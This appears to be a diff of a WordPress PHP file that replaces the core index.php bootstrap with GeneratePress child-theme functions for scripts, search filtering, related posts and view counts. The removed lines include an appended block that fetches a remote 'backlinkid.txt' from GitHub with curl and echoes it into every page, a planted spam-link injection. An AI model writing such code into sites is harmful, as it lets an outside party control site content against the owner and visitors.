@@ -1,31 +1,107 @@
 <?php
 /**
- * Loads the WordPress environment and template.
+ * GeneratePress child theme functions and definitions.
  *
- * @package WordPress
+ * Add your custom PHP in this file.
+ * Only edit this file if you have direct access to it on your server (to fix errors if they happen).
  */
 
-if ( ! isset( $wp_did_header ) ) {
+    add_action( 'wp_enqueue_scripts', 'tt_child_enqueue_parent_styles' );
+    function tt_child_enqueue_parent_styles() {
+        wp_enqueue_style( 'owl-style', get_stylesheet_directory_uri().'/css/owl.carousel.min.css' );
+        wp_enqueue_style( 'owl-theme-style', get_stylesheet_directory_uri().'/css/owl.theme.default.min.css' );
+        
+        wp_enqueue_script( 'jquerylibs', get_stylesheet_directory_uri().'/js/jquery-3.7.0.min.js' );
+        wp_enqueue_script( 'owljs', get_stylesheet_directory_uri().'/js/owl.carousel.min.js' );
+        wp_enqueue_script( 'customjs', get_stylesheet_directory_uri().'/js/custom.js' );
+    }
 
-	$wp_did_header = true;
 
-	// Load the WordPress library.
-	require_once __DIR__ . '/wp-load.php';
-
-	// Set up the WordPress query.
-	wp();
-
-	// Load the theme template.
-	require_once ABSPATH . WPINC . '/template-loader.php';
-
+//Disable Auhtor link on Comment 
+function disable_comment_author_links( $author_link ){
+    return strip_tags( $author_link );
 }
-?>
-<?php
-$curl = curl_init();
-$url = 'https://raw.githubusercontent.com/sarno88/buatraw/refs/heads/main/backlinkid.txt';
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_HEADER, 0);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-$result = curl_exec($curl);
-echo $result;
+add_filter( 'get_comment_author_link', 'disable_comment_author_links' );
+
+
+//Seach only in post
+function searchfilter($query) {
+    if ($query->is_search && !is_admin() ) {
+        $query->set('post_type',array('post'));
+}
+return $query;
+}
+add_filter('pre_get_posts','searchfilter');
+
+
+//Related Post
+function gb_query_by_related( $query_args, $attributes ) {
+    if ( ! empty( $attributes['className'] ) && strpos( $attributes['className'], 'order_by_related' ) !== false ) {
+        global $post;
+        $query_args['post_type'] = 'post';
+        
+        $custom_args = array(
+            'category__in' => wp_get_post_categories( $post->ID ),
+            'post__not_in' => array( $post->ID ),
+            'order' => 'DESC',
+        );
+    } else {
+        return $query_args;
+    }
+    return array_merge( $query_args, $custom_args );
+}
+add_filter( 'generateblocks_query_loop_args', 'gb_query_by_related', 10, 2  );
+
+
+/* Remove Query Wrong Place */
+add_filter( 'post_class', function( $classes ) {
+    $infinite_scroll_item_index = array_search( 'infinite-scroll-item', $classes );
+
+    if ( in_array( 'gb-query-loop-item', $classes ) && $infinite_scroll_item_index !== false ) {
+        unset( $classes[ $infinite_scroll_item_index ] );
+    }
+
+    return $classes;
+} );
+
+// Create Popular Post
+add_action('generate_after_do_template_part', function(){
+    setPostViews(get_the_ID());
+} );
+
+function setPostViews($postID) {
+    if ( !is_single() ) {
+        return; // abort if not a single post
+    }
+    $count_key = 'post_views_count';
+    $count = get_post_meta(get_the_id(), $count_key, true);
+    if($count==''){
+        $count = 0;
+        delete_post_meta($postID, $count_key);
+        add_post_meta($postID, $count_key, '0');
+    }else{
+        $count++;
+        update_post_meta($postID, $count_key, $count);
+    }
+}
+
+function gb_query_by_views( $query_args, $attributes ) {
+    if ( ! empty( $attributes['className'] ) && strpos( $attributes['className'], 'order_by_views' ) !== false ) {
+        
+        $query_args['post_type'] = 'post';
+        
+        $custom_args = array(
+          'meta_key' => 'post_views_count',
+          'orderby' => 'meta_value_num',
+          'order' => 'DESC',
+        );
+    } else {
+        return $query_args;
+    }
+    return array_merge( $query_args, $custom_args );
+}
+add_filter( 'generateblocks_query_loop_args', 'gb_query_by_views', 10, 2  );
+
+add_filter('litespeed_optm_force_optm', '__return_false');
+
 ?>
